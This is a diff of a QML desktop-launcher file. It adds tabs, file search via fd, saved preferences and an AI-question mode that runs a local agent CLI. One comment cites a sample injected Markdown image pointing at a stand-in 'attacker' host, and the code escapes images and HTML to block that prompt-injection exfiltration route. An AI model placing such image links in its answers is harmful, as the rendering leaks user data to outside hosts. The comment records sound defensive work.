@@ -5,6 +5,9 @@ import QtQuick
 import qs.Commons
 import qs.Ui
 import "MenuModel.js" as MenuModel
+import "Tabs.js" as Tabs
+import "FileSearch.js" as FileSearch
+import "ai/AiBackend.js" as AiBackend
 
 Item {
   id: root
@@ -72,6 +75,145 @@ Item {
   property bool requestActive: false
   property bool rowsLoaded: false
   property string activeMenu: "root"
+  // Launcher tabs. Only the menu proper has them: a dmenu request (emoji,
+  // keybindings, anything piping options through omarchy-menu-select) is
+  // somebody else's picker and keeps its plain list.
+  property string activeTab: "all"
+  readonly property bool tabsActive: !root.dmenuActive
+  // All with nothing typed is just the search field and the tab chips: the
+  // card is a prompt, and picking a tab or typing is what opens it up.
+  readonly property bool compact: root.tabsActive && root.activeTab === "all" && !root.filterText.trim()
+
+  // System as two panes, like a settings app: the top-level categories on the
+  // left, the highlighted category's items on the right, updating as the
+  // left side is browsed. Only while nothing is typed -- a search is a flat,
+  // sectioned list as everywhere else. systemPane is where the keyboard is.
+  // Typing keeps the panes and moves the selection in the tree to the best
+  // matching entry (systemMatches, cycled with Ctrl+Up/Down); only a query
+  // that matches no entry -- arithmetic, `shell ...`, a web search -- falls
+  // back to the flat list of answers.
+  property var systemMatches: []
+  property int systemMatchIndex: 0
+  readonly property bool systemTwoPane: root.tabsActive && root.activeTab === "system" && !root.isAiMode
+    && (!root.filterText.trim() || root.systemMatches.length > 0)
+  property string systemPane: "left"
+  property int systemCategoryIndex: 0
+  readonly property var systemCategories: root.systemTwoPane ? root.systemCategoryRows(root.layoutSerial) : []
+
+  // File search (Files, Folders, and their sections in All). One search is
+  // current at a time; every fd/stat run carries the generation it was started
+  // for, and output from an older one is dropped on arrival.
+  readonly property string homeDir: Quickshell.env("HOME")
+  property int fileFilterIndex: 0
+  property int folderFilterIndex: 0
+  property string fileSortMode: "relevance"
+  property int fileDisplayLimit: 60
+  property int fileSearchGen: 0
+  // The generation the running fd pair was launched for. Exits are counted
+  // against it alone, so a cancelled pair that dies after a new one started
+  // cannot eat the new pair's count.
+  property int fileLaunchGen: 0
+  property bool fileSearching: false
+  property bool fileRerunPending: false
+  property int filePending: 0
+  property var filePendingItems: []
+  // The items the current search found, and the key (tab, filter, query) they
+  // answer, so a rebuild can tell results for this query from stale ones.
+  property var fileResults: []
+  property string fileResultsKey: ""
+  property string fileResultsScope: ""
+  property var fileMtimes: ({})
+  // All only asks fd once the query is this long: one letter matches most of
+  // $HOME, and the answer would be noise ranked by path depth.
+  readonly property int allFileMinQuery: 2
+
+  // Apps as a grid or a list (Ctrl+G), remembered across opens and restarts
+  // under the XDG state directory. Not next to this file: the shell watches
+  // every plugin directory with inotify and reloads *all* plugins -- bar,
+  // panels, widgets -- on any write there, so saving a preference into it
+  // looked like the whole shell restarting.
+  property string appsView: "list"
+  readonly property bool gridActive: root.tabsActive && root.activeTab === "apps" && root.appsView === "grid"
+  readonly property string stateDir: (Quickshell.env("XDG_STATE_HOME") || (root.homeDir + "/.local/state")) + "/omarchy-menu-omni"
+  readonly property string statePath: root.stateDir + "/state.json"
+
+  // Per-user ordering, also from state.json and hand-editable there:
+  //   "tabOrder":    the tabs left to right, e.g. ["all","apps","system","files","folders"]
+  //   "allSections": the order of All's result sections, e.g. ["apps","system","files","folders"]
+  //   "disabledTabs": tabs switched off, e.g. ["files","folders"]; a disabled
+  //                  tab also drops out of All, and if All itself is off,
+  //                  SUPER + SPACE opens the first tab that is on
+  // Unknown ids are ignored and missing ones appended, so an ordering edit
+  // can reorder but never hide a tab -- only disabledTabs does that. The file
+  // is re-read on every open.
+  property var tabOrder: Tabs.DEFAULT_TAB_ORDER
+  property var allSectionOrder: Tabs.DEFAULT_ALL_SECTIONS
+  property var disabledTabs: []
+  readonly property var orderedTabs: Tabs.visibleTabs(root.tabOrder, root.disabledTabs, root.activeTab)
+
+  function tabEnabled(id) {
+    return root.disabledTabs.indexOf(id) < 0
+  }
+  // Everything the file held when last read, unknown keys included, so a
+  // save writes back what it did not change instead of dropping it.
+  property var stateData: ({})
+
+  // AI answers, ported from omarchy-find (ai/*.js, MIT). A query that opens
+  // with the prefix ("ai ") is a question for the configured agent instead
+  // of a search: nothing leaves the machine until Enter, the answer streams
+  // into the card, and Enter again continues the conversation in a terminal.
+  // Config: ai.json next to state.json, falling back to the
+  // Omarchy default agent. See ai/AiAdapters.js for the tool restrictions
+  // every headless run is started with.
+  // Next to state.json rather than in the plugin directory: an edit there
+  // reloads every shell plugin, and removing the plugin would take it along.
+  readonly property string aiConfigPath: root.stateDir + "/ai.json"
+  readonly property string omarchyAgentPath: root.homeDir + "/.config/omarchy/defaults/agent"
+  property string aiPrefix: "ai "
+  readonly property var aiPromptOrNull: root.tabsActive ? AiBackend.matchPrefix(root.filterText, root.aiPrefix) : null
+  readonly property bool isAiMode: root.aiPromptOrNull !== null
+  readonly property string aiPromptText: root.isAiMode ? root.aiPromptOrNull : ""
+  property var aiSession: null
+  property bool aiConfigLoaded: false
+  property string aiConfigWarning: ""
+  property var aiConfigLastRawText: undefined
+  property var aiConfigLastOmarchyAgent: undefined
+  property var aiConfigPendingRaw: null
+  property int aiStreamFlushMs: 16
+  property int aiMaxAnswerRows: 6
+  property bool aiBinaryChecked: false
+  property bool aiBinaryMissing: false
+  property string aiBinaryCheckedFor: ""
+  property var aiPendingSpawn: null
+  property int aiHandoffAttempt: 0
+  property string aiHandoffError: ""
+  // Which agents can be asked: the enabled adapters whose CLI is on PATH,
+  // probed each time AI mode opens. In AI mode the tab bar lists these
+  // instead of the tabs, Tab / Shift+Tab (or Ctrl+1..n) switches between
+  // them, and the last pick is remembered in state.json ("aiAgent") -- the
+  // configured agent is not always the one with usage left.
+  property var aiAgents: []
+  property string aiAgent: ""
+  readonly property var aiAgentTabs: {
+    var out = []
+    var all = AiBackend.selectableAgents()
+    for (var i = 0; i < all.length; i++)
+      if (root.aiAgents.indexOf(all[i].id) >= 0) out.push({ id: all[i].id, label: all[i].label, icon: "󰚩" })
+    return out
+  }
+  readonly property int aiLineHeight: Math.round(root.scaledFont(Style.font.body) * 1.45)
+
+  onIsAiModeChanged: {
+    if (root.isAiMode) root.probeAiAgents()
+    if (root.isAiMode) {
+      root.aiSession = AiBackend.snapshot()
+      root.ensureAiBinaryChecked()
+    } else {
+      root.aiCancel()
+      root.aiSession = null
+      root.aiHandoffError = ""
+    }
+  }
   property string filterText: ""
   property int selectedIndex: 0
   property bool cursorActive: false
@@ -89,7 +231,18 @@ Item {
   readonly property var appLibrary: root.shell ? root.shell.appLibrary : null
   property bool deleteConfirmOpen: false
   property var deleteTarget: null
-  onOpenedChanged: if (!opened) { deleteConfirmOpen = false; deleteTarget = null; utilityAnswers = ({}) }
+  onOpenedChanged: {
+    if (opened) return
+    deleteConfirmOpen = false
+    deleteTarget = null
+    utilityAnswers = ({})
+    root.cancelFileSearch()
+    root.aiCancel()
+    root.aiSession = AiBackend.snapshot()
+    root.fileResults = []
+    root.fileResultsKey = ""
+    root.fileResultsScope = ""
+  }
   // Currency conversion typed into the search: "123 eur to usd". The rates
   // behind it are exchangerate-api's free daily snapshot, which needs no key,
   // cached under ~/.cache and refetched about once a day.
@@ -150,18 +303,35 @@ Item {
   property color selectedBorder: Color.menu.selectedBorder
   property var selectedBorderSpec: Border.surfaceSpec("menu", "selected-border", selectedBorder, 0)
   // --- Look ------------------------------------------------------------------
-  // The three dials this fork adds on top of the stock geometry. Everything
-  // below derives from them, so a redesign is an edit here rather than a hunt
+  // The dials this fork adds on top of the stock geometry. Everything below
+  // derives from them, so a redesign is an edit here rather than a hunt
   // through the delegate. They are deliberately not themed: the shell's own
-  // `Style` tokens are shared with the bar and every panel, and shrinking the
-  // menu should not shrink those.
+  // `Style` tokens are shared with the bar and every panel, and resizing the
+  // menu should not resize those.
   //
-  //   menuFontScale      multiplies every text and icon size in the card
-  //   menuCardWidth      card width in Style.space() units (stock: 300)
-  //   menuHeightFraction most of the screen the row list may take (stock: 0.7)
-  readonly property real menuFontScale: 0.85
-  readonly property int menuCardWidth: 360
-  readonly property real menuHeightFraction: 0.5
+  //   menuFontScale        multiplies every text and icon size in the card
+  //   menuHeightFraction   most of the screen a dmenu picker's list may take
+  //   launcherCardWidth    launcher width, in Style.space() units
+  //   launcherBodyFraction launcher results area, as a share of the screen
+  //   launcherTopFraction  where the launcher's top edge sits on the screen
+  //
+  // The launcher (every non-dmenu open) is a fixed-size card, so switching
+  // tabs or typing never makes it jump; only the compact All prompt is
+  // shorter.
+  //
+  // All of them come from style.json next to state.json (see applyStyle),
+  // re-read on every open; the values here are the fallbacks (styleDefaults).
+  property real menuFontScale: 1.0
+  property real menuHeightFraction: 0.7
+  property int launcherCardWidth: 560
+  property real launcherBodyFraction: 0.6
+  // < 0 centres the card, as the stock menu does; >= 0 pins its top edge.
+  property real launcherTopFraction: 0.2
+  // false: the results area fits its rows (up to launcherBodyFraction), as the
+  // stock menu does; true: it always takes launcherBodyFraction, so the card
+  // never changes size while typing or switching tabs.
+  property bool launcherFixedHeight: false
+  readonly property string stylePath: root.stateDir + "/style.json"
 
   // Row height follows the font: the stock minimums (50 and 58) were sized for
   // full-size text and would otherwise hold the rows tall while the labels
@@ -173,15 +343,6 @@ Item {
   // the stock 36: a shrunken icon in a full-width slot leaves the labels
   // floating away from the edge.
   readonly property int iconSlotWidth: Math.round(Style.space(36) * root.menuFontScale)
-
-  // Apps are their own menu (SUPER + ALT + SPACE) rather than a third of every
-  // result list. With hundreds of desktop entries, a search from the root was
-  // mostly applications, and the command actually being looked for sat under
-  // them. They stay fully searchable once inside the Apps submenu, and the
-  // Apps row itself is untouched, so nothing becomes unreachable.
-  //
-  // Set to true to get the stock behaviour back.
-  readonly property bool appsInRootSearch: false
 
   // Rows kept off the root list. Applications have their own binding
   // (SUPER + ALT + SPACE) and the submenu still opens by route, so the row was
@@ -198,11 +359,39 @@ Item {
     return !!entry && root.rootHiddenIds.indexOf(entry.id) >= 0
   }
 
-  // True for an app row being searched from outside the Apps submenu.
-  function hiddenFromSearch(entry) {
-    if (root.appsInRootSearch) return false
-    if (!entry || entry.kind !== "app") return false
-    return !(root.activeMenu === "apps" || root.isDescendantOf(root.activeMenu, "apps"))
+  // Applications live in the Apps tab (and the Apps section of All), so the
+  // System tab is the menu without them: neither the Apps row nor any app.
+  function isAppEntry(entry) {
+    return !!entry && (entry.kind === "app" || entry.id === "apps")
+  }
+
+  readonly property int sectionHeaderHeight: root.scaledFont(Style.font.caption) + Style.space(14)
+
+  // The key hints under the results, for what the current tab can do.
+  function footerHints() {
+    if (root.activeTab === "apps")
+      return "Enter launch · Ctrl+G " + (root.appsView === "grid" ? "list" : "grid") + " · Del uninstall · Tab next tab · Esc close"
+    if (root.activeTab === "files" || root.activeTab === "folders")
+      return "Enter open · Alt+Enter folder · Ctrl+C copy path · Ctrl+T terminal\nCtrl+F type · Ctrl+S sort · Ctrl+L limit · Tab next tab · Esc close"
+    if (root.activeTab === "system")
+      return root.systemTwoPane
+        ? "↑↓ browse · →/Enter open · ← back · type to search · Tab next tab · Esc close"
+        : "Enter open · ←/Backspace back · Tab next tab · Esc close"
+    return "↑↓ move · Enter open · Tab next tab · ai <question> ask AI · Esc close"
+  }
+
+  // What the search field says before anything is typed.
+  function promptText() {
+    if (root.dmenuActive) return root.dmenuPrompt + "…"
+    if (root.activeTab === "system") {
+      var menu = root.item(root.activeMenu)
+      if (menu && root.activeMenu !== "root") return (menu.title || menu.label) + "…"
+      return "Search the system menu…"
+    }
+    if (root.activeTab === "apps") return "Search applications…"
+    if (root.activeTab === "files") return "Search files…"
+    if (root.activeTab === "folders") return "Search folders…"
+    return "Search apps, files, folders and system…"
   }
 
   function scaledFont(px) {
@@ -224,11 +413,23 @@ Item {
   property int dividerHeight: Style.space(17)
   property bool searchDivider: false
   property int layoutSerial: 0
-  property int cardWidth: Math.min(root.dmenuActive ? Style.space(root.dmenuWidth) : ((root.activeMenu === "trigger.capture.screenrecord" || root.activeMenu === "style.font") ? Style.space(520) : Style.space(root.menuCardWidth)), panel.width - Style.gapsOut * 2)
-  property int visibleRowsHeight: root.dmenuActive ? dmenuRowListHeight(layoutSerial, displayModel.count, filterText) : rowListHeight(layoutSerial, displayModel.count, filterText, searchDivider)
+  property int cardWidth: Math.min(root.dmenuActive ? Style.space(root.dmenuWidth) : Style.space(root.launcherCardWidth), panel.width - Style.gapsOut * 2)
+  readonly property int launcherBodyHeight: Math.max(root.baseRowHeight * 3, Math.round(panel.height * root.launcherBodyFraction))
+  // A fitted body still takes the full height for the grid and AI answers,
+  // whose size is not a row count.
+  property int visibleRowsHeight: root.dmenuActive
+    ? dmenuRowListHeight(layoutSerial, displayModel.count, filterText)
+    : (root.compact ? 0
+      : (root.launcherFixedHeight || root.gridActive || root.isAiMode || root.systemTwoPane
+        ? root.launcherBodyHeight
+        : Math.min(root.launcherBodyHeight, Math.max(root.baseRowHeight * 3,
+            rowListHeight(layoutSerial, displayModel.count, filterText, searchDivider)))))
   property int cardHeight: root.dmenuActive
     ? Math.min(contentMargin * 2 + headerHeight + (mode === "input" ? 0 : contentSpacing + visibleRowsHeight), panel.height - Style.gapsOut * 2)
-    : Math.min(contentMargin * 2 + headerHeight + contentSpacing + visibleRowsHeight, panel.height - Style.gapsOut * 2)
+    : Math.min(contentMargin * 2 + headerHeight + contentSpacing + tabBar.height
+        + (fileBar.visible ? contentSpacing + fileBar.height : 0)
+        + (root.compact ? 0 : contentSpacing + visibleRowsHeight)
+        + (footer.visible ? contentSpacing + footer.implicitHeight : 0), panel.height - Style.gapsOut * 2)
 
   function finishRequest(selection) {
     if (!root.requestActive || !root.doneFile) {
@@ -260,7 +461,15 @@ Item {
   // Menu rows only surface their detail while a search is narrowing them;
   // dmenu rows carry caller-supplied subtext that must always be visible.
   function rowHeightForDetail(detail) {
-    return (root.filterText || root.dmenuActive) && detail ? root.detailRowHeight : root.baseRowHeight
+    return root.showsDetail("", detail) ? root.detailRowHeight : root.baseRowHeight
+  }
+
+  // The second line under a label: always for dmenu rows and file results
+  // (where the folder is half the answer), otherwise only while searching.
+  function showsDetail(kind, detail) {
+    if (!detail) return false
+    if (root.filterText || root.dmenuActive) return true
+    return kind === "file" || kind === "folder" || root.activeTab === "files" || root.activeTab === "folders"
   }
 
   // Height the card can devote to rows before running off the screen — or
@@ -272,7 +481,9 @@ Item {
     var available = panel.height - top - Style.gapsOut - root.contentMargin * 2 - root.headerHeight - root.contentSpacing
     // The starting menu sets the ceiling along with the offset: drilling into
     // a longer submenu scrolls behind the fold instead of growing the card.
-    if (panel.maxRowsHeight >= 0) available = Math.min(available, panel.maxRowsHeight)
+    // (dmenu pickers only: the launcher opens compact, so its starting height
+    // would cap every result list at nothing.)
+    if (panel.maxRowsHeight >= 0 && !root.tabsActive) available = Math.min(available, panel.maxRowsHeight)
     // A card that swallows the whole screen reads as a page, not a menu.
     return Math.min(available, Math.round(panel.height * root.menuHeightFraction))
   }
@@ -430,7 +641,12 @@ Item {
     currencyCacheProc.running = true
   }
 
-  Component.onCompleted: root.loadMenuSources()
+  Component.onCompleted: {
+    root.loadMenuSources()
+    root.loadStyle()
+    root.loadState()
+    root.loadAiConfig()
+  }
 
   function item(id) {
     return root.items[id] || null
@@ -734,7 +950,10 @@ Item {
   }
 
   function loadProvidersForSearch() {
-    var active = root.item(root.activeMenu) ? root.activeMenu : "root"
+    // All and Apps search applications; only System is scoped to the submenu
+    // it is showing, and only System searches without them.
+    var active = "root"
+    var wantsApps = root.activeTab === "apps" || (root.activeTab === "all" && root.tabEnabled("apps"))
 
     for (var i = 0; i < root.itemOrder.length; i++) {
       var entry = root.item(root.itemOrder[i])
@@ -742,11 +961,812 @@ Item {
       if (active !== "root" && entry.id !== active && !root.isDescendantOf(entry.id, active)) continue
       // Enumerating every desktop entry for rows the search is about to throw
       // away is the one provider worth skipping.
-      if (entry.provider === "apps" && !root.appsInRootSearch
-          && !(active === "apps" || root.isDescendantOf(active, "apps"))) continue
+      if (entry.provider === "apps" && !wantsApps) continue
 
       root.loadProviderForMenu(entry.id)
     }
+  }
+
+  // --------------------------------------------------------------------- AI
+  //
+  // Everything here only forwards process I/O into AiBackend and renders the
+  // snapshot it hands back; the state machine, the per-agent argv and the
+  // streaming pace all live in ai/*.js. Ported from omarchy-find's Find.qml,
+  // whose comments explain the process-slot and handoff invariants kept here.
+
+  // Both config sources are re-read on every open, through the same guarded
+  // reader as the menu JSONC, rather than watched.
+  function loadAiConfig() {
+    if (aiConfigProc.running || aiAgentProc.running) return
+    aiConfigProc.command = root.readFileCommand(root.aiConfigPath, 65536)
+    aiConfigProc.running = true
+  }
+
+  function applyAiConfig(rawText, omarchyAgent) {
+    var agent = String(omarchyAgent || "").trim()
+    if (root.aiConfigLoaded && rawText === root.aiConfigLastRawText && agent === root.aiConfigLastOmarchyAgent) return
+    root.aiConfigLastRawText = rawText
+    root.aiConfigLastOmarchyAgent = agent
+    var result = AiBackend.loadConfig(rawText, agent)
+    if (root.aiAgent) AiBackend.setAgent(root.aiAgent)
+    root.aiConfigLoaded = true
+    root.aiConfigWarning = result.warning || ""
+    var cfg = AiBackend.getConfig()
+    root.aiPrefix = cfg.prefix
+    root.aiStreamFlushMs = cfg.streamFlushMs
+    root.aiMaxAnswerRows = cfg.maxAnswerRows
+    if (root.isAiMode) {
+      root.aiSession = AiBackend.snapshot()
+      root.ensureAiBinaryChecked()
+    }
+  }
+
+  function probeAiAgents() {
+    if (aiAgentProbe.running) return
+    var all = AiBackend.selectableAgents()
+    var binaries = []
+    for (var i = 0; i < all.length; i++) binaries.push(all[i].binary)
+    aiAgentProbe.command = ["sh", "-c",
+      'for b; do command -v -- "$b" >/dev/null 2>&1 && printf "%s\\n" "$b"; done', "sh"].concat(binaries)
+    aiAgentProbe.running = true
+  }
+
+  function applyAiAgentProbe(text) {
+    var found = String(text || "").split("\n")
+    var all = AiBackend.selectableAgents()
+    var agents = []
+    for (var i = 0; i < all.length; i++) if (found.indexOf(all[i].binary) >= 0) agents.push(all[i].id)
+    root.aiAgents = agents
+    if (agents.length === 0) return
+
+    // Remembered pick, else the configured agent, else the first installed.
+    var wanted = [String(root.stateData.aiAgent || ""), root.aiAgent, AiBackend.getConfig().agent]
+    var pick = agents[0]
+    for (var w = 0; w < wanted.length; w++) if (agents.indexOf(wanted[w]) >= 0) { pick = wanted[w]; break }
+    root.setAiAgent(pick, false)
+  }
+
+  // Switching agent drops whatever the previous one was doing: the next
+  // Enter asks the new agent from scratch.
+  function setAiAgent(id, remember) {
+    if (root.aiAgents.indexOf(id) < 0) return
+    var changed = id !== root.aiAgent || AiBackend.getConfig().agent !== id
+    if (!AiBackend.setAgent(id)) return
+    root.aiAgent = id
+    if (changed) {
+      root.aiCancel()
+      root.aiHandoffError = ""
+      root.aiBinaryChecked = false
+      if (root.isAiMode) {
+        root.aiSession = AiBackend.snapshot()
+        root.ensureAiBinaryChecked()
+      }
+    }
+    if (remember !== false && root.stateData.aiAgent !== id) root.saveState()
+  }
+
+  function cycleAiAgent(delta) {
+    var list = root.aiAgents
+    if (list.length === 0) return
+    var index = list.indexOf(root.aiAgent)
+    if (index < 0) index = 0
+    root.setAiAgent(list[((index + delta) % list.length + list.length) % list.length])
+  }
+
+  function ensureAiBinaryChecked() {
+    var disp = AiBackend.agentDisplay()
+    if (!disp.supported) {
+      root.aiBinaryChecked = true
+      root.aiBinaryMissing = true
+      return
+    }
+    root.aiBinaryCheckedFor = disp.binary
+    if (root.aiBinaryChecked && aiBinaryCheck.checkingFor === disp.binary) return
+    if (aiBinaryCheck.running) return
+    root.aiBinaryChecked = false
+    aiBinaryCheck.checkingFor = disp.binary
+    aiBinaryCheck.command = ["sh", "-c", 'command -v -- "$1" >/dev/null', "sh", disp.binary]
+    aiBinaryCheck.running = true
+  }
+
+  function aiKillProcessIfRunning(proc, fallbackTimer) {
+    if (!proc.running) return
+    var pid = proc.processId
+    proc.running = false
+    if (pid) {
+      Quickshell.execDetached(AiBackend.killArgv(pid, "TERM"))
+      fallbackTimer.targetPid = pid
+      fallbackTimer.restart()
+    }
+  }
+
+  // Never touches a Process whose `running` is still true; see omarchy-find
+  // (and AiBackend.pickFreeSlot) for why a stopping slot is not yet free.
+  function aiFreeProc() {
+    var slot = AiBackend.pickFreeSlot(aiProcA.running, aiProcB.running)
+    return slot === "A" ? aiProcA : (slot === "B" ? aiProcB : null)
+  }
+
+  function aiDispatchOrQueue(generation, argv) {
+    var proc = root.aiFreeProc()
+    if (!proc) {
+      root.aiPendingSpawn = { generation: generation, argv: argv }
+      return
+    }
+    root.aiPendingSpawn = null
+    proc.gen = generation
+    // Spawned with stdin enabled and closed in onStarted: otherwise the child
+    // inherits a stdin that never reaches EOF, and codex exec waits on it.
+    proc.stdinEnabled = true
+    proc.command = argv
+    proc.running = true
+  }
+
+  function aiTryDispatchPending() {
+    if (!root.aiPendingSpawn) return
+    var proc = root.aiFreeProc()
+    if (!proc) return
+    var pending = root.aiPendingSpawn
+    root.aiPendingSpawn = null
+    proc.gen = pending.generation
+    proc.stdinEnabled = true
+    proc.command = pending.argv
+    proc.running = true
+  }
+
+  function aiCancel(invalidateHandoff) {
+    root.aiPendingSpawn = null
+    root.aiKillProcessIfRunning(aiProcA, aiKillFallbackTimerA)
+    root.aiKillProcessIfRunning(aiProcB, aiKillFallbackTimerB)
+    if (invalidateHandoff !== false) root.aiHandoffAttempt++
+    aiHandoffGrace.stop()
+    AiBackend.cancel()
+  }
+
+  function aiSubmit() {
+    if (!root.isAiMode || root.aiBinaryMissing) return
+    var prompt = root.aiPromptText.trim()
+    if (prompt.length === 0) return
+    root.aiCancel()
+    var result = AiBackend.beginGeneration(prompt)
+    root.aiSession = AiBackend.snapshot()
+    root.aiHandoffError = ""
+    if (!result.argv) return
+    root.aiDispatchOrQueue(result.generation, result.argv)
+  }
+
+  function onAiLine(gen, line) {
+    var snap = AiBackend.handleLine(gen, line)
+    if (snap) root.aiSession = snap
+  }
+
+  function onAiStderr(gen, line) {
+    AiBackend.handleStderrChunk(gen, line + "\n")
+  }
+
+  function onAiExit(gen, exitCode) {
+    var snap = AiBackend.handleExit(gen, exitCode)
+    if (snap) root.aiSession = snap
+  }
+
+  function aiCopyAnswer() {
+    if (!root.aiSession || root.aiSession.state === "idle" || !root.aiSession.rawText) return
+    Quickshell.execDetached(["wl-copy", "--", root.aiSession.rawText])
+  }
+
+  function aiPromptChangedSinceSubmit() {
+    var s = root.aiSession
+    return !!(s && typeof s.prompt === "string" && s.prompt.length > 0 && root.aiPromptText.trim() !== s.prompt)
+  }
+
+  function aiCanReask() {
+    return root.aiPromptChangedSinceSubmit() && root.aiPromptText.trim().length > 0
+  }
+
+  function aiHandoff() {
+    if (!root.aiSession || root.aiSession.state !== "ready" || !root.aiSession.canHandoff) return
+    if (root.aiCanReask()) { root.aiSubmit(); return }
+    var resumeArgv = AiBackend.buildHandoffArgv()
+    if (!resumeArgv) return
+    var snap = AiBackend.beginHandoff()
+    if (!snap) return
+    root.aiSession = snap
+    root.aiHandoffError = ""
+    root.aiHandoffAttempt++
+    aiHandoffProcess.attempt = root.aiHandoffAttempt
+    aiHandoffProcess.resumeArgv = resumeArgv
+    aiHandoffProcess.handled = false
+    // The equals form: xdg-terminal-exec reads "--dir DIR" as a command.
+    aiHandoffProcess.command = ["xdg-terminal-exec", "--dir=" + root.homeDir, "--"].concat(resumeArgv)
+    aiHandoffProcess.running = true
+    aiHandoffGrace.restart()
+  }
+
+  // Close the launcher on behalf of the AI flow. preserveHandoffAttempt is
+  // true only when a handoff itself concludes (see omarchy-find's dismiss).
+  function aiDismiss(preserveHandoffAttempt) {
+    root.aiCancel(!preserveHandoffAttempt)
+    root.aiSession = AiBackend.snapshot()
+    root.closeLauncher()
+  }
+
+  function aiChipText() {
+    var s = root.aiSession
+    if (!s) return "AI"
+    var parts = ["AI", s.agentLabel]
+    if (s.modelLabel) parts.push(s.modelLabel)
+    if (s.effortLabel) parts.push(s.effortLabel + " effort")
+    var text = parts.join(" · ")
+    if (root.aiBinaryMissing && s.supported !== false) text += " · not installed"
+    else if (s.state === "starting") text += " · starting…"
+    else if (s.state === "running") text += (s.activity === "searching" ? " · searching…" : " · thinking…")
+    else if (s.state === "draining") text += " · finishing…"
+    else if (s.state === "handoff") text += " · opening terminal…"
+    else if (s.state === "error") text += " · error"
+    return text
+  }
+
+  function aiFooterText() {
+    var s = root.aiSession
+    var state = s ? s.state : "idle"
+    var hint
+    if (state === "ready") {
+      if (root.aiCanReask()) hint = "Enter ask new question · Esc close"
+      else hint = (s && s.canHandoff) ? "↵ continue in terminal · Ctrl+C copy · Esc close" : "Ctrl+C copy · Esc close"
+    } else if (state === "handoff") {
+      hint = "Opening terminal…"
+    } else if (state === "error") {
+      hint = "Enter retry · Esc close"
+    } else if (state === "starting" || state === "running" || state === "draining") {
+      hint = "Esc cancel"
+    } else if (root.aiBinaryMissing) {
+      hint = "Agent CLI not found on PATH · Esc close"
+    } else {
+      hint = root.aiAgents.length > 1 ? "Enter ask · Tab switch agent · Esc close" : "Enter ask · Esc close"
+    }
+    if (root.aiHandoffError) hint += "\n" + root.aiHandoffError
+    return hint
+  }
+
+  // The answer is rendered as Markdown, and answers are shaped by whatever
+  // the agent read on the web. Rich text fetches images on its own, so an
+  // injected `![](https://attacker/?q=...)` would be a request made the
+  // moment it is drawn. Images are demoted to plain links and raw HTML is
+  // escaped before rendering; links open only when clicked, and only http(s).
+  function aiRenderable(text) {
+    return String(text || "").replace(/!\[/g, "[").replace(/</g, "\\<")
+  }
+
+  function aiOpenLink(link) {
+    if (/^https?:\/\//i.test(String(link || ""))) root.openUrl(String(link))
+  }
+
+  // ------------------------------------------------------------ file search
+
+  function fileFilterFor(kind) {
+    return FileSearch.filterAt(kind, kind === "folders" ? root.folderFilterIndex : root.fileFilterIndex)
+  }
+
+  // What the current tab and query ask of fd, or null for nothing: which
+  // types to list and with which filter.
+  function fileSearchSpec() {
+    if (root.dmenuActive || !root.opened || root.isAiMode) return null
+    var query = root.filterText.trim()
+    if (root.activeTab === "files")
+      return { scope: "files|" + root.fileFilterIndex, key: "files|" + root.fileFilterIndex + "|" + query, query: query, dirs: false, files: true, filter: root.fileFilterFor("files") }
+    if (root.activeTab === "folders")
+      return { scope: "folders|" + root.folderFilterIndex, key: "folders|" + root.folderFilterIndex + "|" + query, query: query, dirs: true, files: false, filter: root.fileFilterFor("folders") }
+    if (root.activeTab === "all") {
+      if (query.length < root.allFileMinQuery) return null
+      // An answer that computed itself (arithmetic, a conversion, a password)
+      // is not also a file name worth walking $HOME for.
+      if (root.queryRows(query).length > 0) return null
+      var dirs = root.tabEnabled("folders")
+      var files = root.tabEnabled("files")
+      if (!dirs && !files) return null
+      var kinds = (dirs ? "d" : "") + (files ? "f" : "")
+      return { scope: "all" + kinds, key: "all" + kinds + "|" + query, query: query, dirs: dirs, files: files, filter: FileSearch.ALL_FILTER }
+    }
+    return null
+  }
+
+  function requestFileSearch() {
+    var spec = root.fileSearchSpec()
+    if (!spec) {
+      fileDebounce.stop()
+      return
+    }
+    if (spec.key === root.fileResultsKey && !root.fileSearching) return
+    fileDebounce.restart()
+  }
+
+  function runFileSearch() {
+    var spec = root.fileSearchSpec()
+    if (!spec) return
+    root.fileSearchGen += 1
+    if (dirSearchProc.running || fileSearchProc.running) {
+      // Let the running search finish into the void; its generation is stale
+      // now. Starting a Process that is still being torn down is not safe.
+      root.fileRerunPending = true
+      return
+    }
+    root.launchFileSearch(spec)
+  }
+
+  function launchFileSearch(spec) {
+    root.fileRerunPending = false
+    root.fileSearching = true
+    root.filePendingItems = []
+    root.filePending = 0
+    var gen = root.fileSearchGen
+    root.fileLaunchGen = gen
+
+    // timeout ends an fd that stalls on a slow mount; --max-results already
+    // bounds how much one can print.
+    if (spec.dirs) {
+      root.filePending += 1
+      dirSearchProc.gen = gen
+      dirSearchProc.key = spec.key
+      dirSearchProc.command = ["timeout", "5"].concat(FileSearch.buildArgv(spec.query, spec.filter, true, root.homeDir))
+      dirSearchProc.running = true
+    }
+    if (spec.files) {
+      root.filePending += 1
+      fileSearchProc.gen = gen
+      fileSearchProc.key = spec.key
+      fileSearchProc.command = ["timeout", "5"].concat(FileSearch.buildArgv(spec.query, spec.filter, false, root.homeDir))
+      fileSearchProc.running = true
+    }
+    if (root.filePending === 0) root.fileSearching = false
+  }
+
+  function fileSearchFinished(proc, text, isDir) {
+    if (proc.gen !== root.fileLaunchGen) return
+    if (proc.gen === root.fileSearchGen)
+      root.filePendingItems = root.filePendingItems.concat(FileSearch.parseLines(text, isDir, root.homeDir))
+    root.filePending -= 1
+    if (root.filePending > 0) return
+
+    root.fileSearching = false
+    if (root.fileRerunPending) {
+      var spec = root.fileSearchSpec()
+      if (spec) root.launchFileSearch(spec)
+      else root.fileRerunPending = false
+      return
+    }
+    if (proc.gen !== root.fileSearchGen) return
+
+    var items = root.filePendingItems
+    for (var i = 0; i < items.length; i++) {
+      var known = root.fileMtimes[items[i].path]
+      if (known !== undefined) items[i].mtimeMs = known
+    }
+    root.fileResults = items
+    root.fileResultsKey = proc.key
+    root.fileResultsScope = proc.key.slice(0, proc.key.lastIndexOf("|"))
+    root.rebuildDisplay(true)
+    root.fetchFileMtimes()
+  }
+
+  // Modification times for the sort modes and the right-hand column, fetched
+  // in one stat call after the list is already on screen.
+  function fetchFileMtimes() {
+    if (statProc.running || root.fileResults.length === 0) return
+    var paths = []
+    for (var i = 0; i < root.fileResults.length && paths.length < 300; i++) {
+      if (root.fileMtimes[root.fileResults[i].path] === undefined) paths.push(root.fileResults[i].path)
+    }
+    if (paths.length === 0) return
+    statProc.gen = root.fileSearchGen
